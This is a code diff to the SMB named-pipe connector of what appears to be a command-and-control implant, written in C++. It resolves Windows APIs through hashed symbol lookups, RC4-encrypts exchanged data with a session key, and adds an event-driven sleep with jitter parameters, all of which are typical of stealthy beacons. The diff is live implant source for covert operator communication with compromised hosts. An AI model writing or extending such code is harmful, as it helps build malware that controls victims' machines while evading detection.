@@ -41,6 +41,14 @@ ConnectorSMB::ConnectorSMB()
 	this->functions->FreeSid                      = (decltype(FreeSid)*)                      GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_FREESID);
 	this->functions->SetEntriesInAclA             = (decltype(SetEntriesInAclA)*)             GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETENTRIESINACLA);
 	this->functions->SetSecurityDescriptorDacl    = (decltype(SetSecurityDescriptorDacl)*)    GetSymbolAddress(SysModules->Advapi32, HASH_FUNC_SETSECURITYDESCRIPTORDACL);
+
+    this->functions->CreateEventA = ApiWin->CreateEventA;
+    this->functions->SetEvent     = ApiWin->SetEvent;
+    this->functions->ResetEvent   = ApiWin->ResetEvent;
+    this->functions->WaitForMultipleObjects = (decltype(WaitForMultipleObjects)*)    GetSymbolAddress(SysModules->Kernel32, HASH_FUNC_WAITFORMULTIPLEOBJECTS);
+    
+    this->hTermEvent = this->functions->CreateEventA(NULL, TRUE, FALSE, NULL);
+
 }
 
 BOOL ConnectorSMB::SetProfile(void* profilePtr, BYTE* beatData, ULONG beatDataSize)
@@ -92,57 +100,66 @@ void ConnectorSMB::SendData(BYTE* data, ULONG data_size)
 {
     this->recvSize = 0;
 
-    if (data && data_size) {
-        DWORD NumberOfBytesWritten = 0;
-        if ( this->functions->WriteFile(this->hChannel, (LPVOID)&data_size, 4, &NumberOfBytesWritten, NULL) ) {
-            
-            DWORD index = 0;
-            DWORD size  = 0;
-            NumberOfBytesWritten = 0;
-            while (1) {
-                size = data_size - index;
-                if (data_size - index > 0x2000)
-                    size = 0x2000;
+    if (!data || !data_size)
+        return;
 
-                if ( !this->functions->WriteFile(this->hChannel, data + index, size, &NumberOfBytesWritten, 0) )
-                    break;
+    // Write outgoing data in chunks
+    DWORD NumberOfBytesWritten = 0;
+    if ( this->functions->WriteFile(this->hChannel, (LPVOID)&data_size, 4, &NumberOfBytesWritten, NULL) ) {
+        
+        DWORD index = 0;
+        DWORD size  = 0;
+        NumberOfBytesWritten = 0;
+        while (1) {
+            size = data_size - index;
+            if (data_size - index > 0x2000)
+                size = 0x2000;
 
-                index += NumberOfBytesWritten;
-                if (index >= data_size)
-                    break;
-            }
+            if ( !this->functions->WriteFile(this->hChannel, data + index, size, &NumberOfBytesWritten, 0) )
+                break;
+
+            index += NumberOfBytesWritten;
+            if (index >= data_size)
+                break;
         }
-        this->functions->FlushFileBuffers(this->hChannel);
     }
+
+    this->functions->FlushFileBuffers(this->hChannel);
+
 
     DWORD totalBytesAvail = 0;
     BOOL result = this->functions->PeekNamedPipe(this->hChannel, 0, 0, 0, &totalBytesAvail, 0);
     if (result && totalBytesAvail >= 4) {
+        this->ReadIncoming();
+    }
+}
 
-        DWORD NumberOfBytesRead = 0;
-        DWORD dataLength = 0;
-        if ( this->functions->ReadFile(this->hChannel, &dataLength, 4, &NumberOfBytesRead, 0) ) {
-            
-            if (dataLength > this->allocaSize) {
-                this->recvData = (BYTE*) this->functions->LocalReAlloc(this->recvData, dataLength, 0);
-                this->allocaSize = dataLength;
-            }
+void ConnectorSMB::ReadIncoming()
+{
 
-            NumberOfBytesRead = 0;
-            int index = 0;
-            while( this->functions->ReadFile(this->hChannel, this->recvData + index, dataLength - index, &NumberOfBytesRead, 0) && NumberOfBytesRead) {
-                index += NumberOfBytesRead;
+    DWORD NumberOfBytesRead = 0;
+    DWORD dataLength = 0;
+    if ( this->functions->ReadFile(this->hChannel, &dataLength, 4, &NumberOfBytesRead, 0) ) {
         
-                if (index > dataLength) {
-                    this->recvSize = -1;
-                    return;
-                }
-
-                if (index == dataLength)
-                    break;
-            }
-            this->recvSize = index;
+        if (dataLength > this->allocaSize) {
+            this->recvData = (BYTE*) this->functions->LocalReAlloc(this->recvData, dataLength, 0);
+            this->allocaSize = dataLength;
         }
+
+        NumberOfBytesRead = 0;
+        int index = 0;
+        while( this->functions->ReadFile(this->hChannel, this->recvData + index, dataLength - index, &NumberOfBytesRead, NULL) && NumberOfBytesRead) {
+            index += NumberOfBytesRead;
+    
+            if (index > dataLength) {
+                this->recvSize = -1;
+                return;
+            }
+
+            if (index == dataLength)
+                break;
+        }
+        this->recvSize = index;
     }
 }
 
@@ -196,7 +213,19 @@ void ConnectorSMB::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
         EncryptRC4(plainData, plainSize, sessionKey, 16);
         this->SendData(plainData, plainSize);
     } else {
-        this->SendData(NULL, 0);
+        this->recvSize = 0;
+
+        if (this->dataReady) {
+            this->dataReady = FALSE;
+            this->ReadIncoming();
+        } else {
+
+            DWORD totalBytesAvail = 0;
+            BOOL result = this->functions->PeekNamedPipe(this->hChannel, 0, 0, 0, &totalBytesAvail, 0);
+            if (result && totalBytesAvail >= 4) {
+                this->ReadIncoming();
+            }
+        }
     }
 
     if (this->recvSize == 0 && TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
@@ -236,5 +265,42 @@ void ConnectorSMB::CloseConnector()
         this->beat = nullptr;
         this->beatSize = 0;
     }
+    if (this->hTermEvent) {
+        
+        this->functions->SetEvent(this->hTermEvent);
+
+        this->functions->NtClose(this->hTermEvent);
+        this->hTermEvent = nullptr;
+    }
     this->functions->NtClose(this->hChannel);
+}
+
+void ConnectorSMB::Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput)
+{
+    if (hasOutput)
+        return;
+
+    if (!this->connected || !this->hChannel)
+        return;
+
+    HANDLE waitHandles[3];
+    DWORD  handleCount = 0;
+
+    waitHandles[handleCount++] = this->hChannel;
+    waitHandles[handleCount++] = this->hTermEvent;
+    if (wakeupEvent)
+        waitHandles[handleCount++] = wakeupEvent;
+
+    DWORD result = this->functions->WaitForMultipleObjects(handleCount, waitHandles, FALSE, INFINITE);
+
+    if (result == WAIT_OBJECT_0) {
+        this->dataReady = TRUE;
+    }
+    else if (result == WAIT_OBJECT_0 + 1) {
+        this->connected = FALSE;
+    }
+    else if (result == WAIT_OBJECT_0 + 2 && wakeupEvent) {
+        this->functions->ResetEvent(wakeupEvent);
+    }
+
 }
